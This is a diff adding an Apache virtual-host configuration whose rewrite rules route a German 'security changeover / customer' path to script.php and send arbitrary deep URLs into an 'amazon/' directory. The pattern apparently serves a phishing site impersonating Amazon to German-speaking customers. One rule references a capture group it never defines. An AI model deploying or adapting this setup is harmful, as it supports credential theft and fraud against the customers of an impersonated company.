@@ -1,0 +1,31 @@
+<VirtualHost *:80>
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html
+	DirectoryIndex index.php
+	<Directory />
+		Options FollowSymLinks
+		AllowOverride None
+	</Directory>
+	<Directory /var/www/html>
+		DirectoryIndex index.php
+		Options FollowSymLinks MultiViews
+		AllowOverride All 
+		
+		RewriteEngine On
+		
+		RewriteRule ^sicherheits/umstellung/kunde/$                                	script.php [l]
+		
+		RewriteRule ^([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/$                          amazon/$7 [L]
+		RewriteRule ^([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)$                           amazon/$7 [L]
+		RewriteRule ^([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)$                           amazon/$7/$8 [L]
+		RewriteRule ^([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)$                           amazon/$7/$8/$9 [L]
+		
+		RewriteCond %{REQUEST_FILENAME} !-f
+		RewriteRule ^(.*)$         %{REQUEST_URI}/index.php [L,NC]
+		Order allow,deny
+		allow from all
+	</Directory>
+	ErrorLog ${APACHE_LOG_DIR}/error.log
+
+	CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
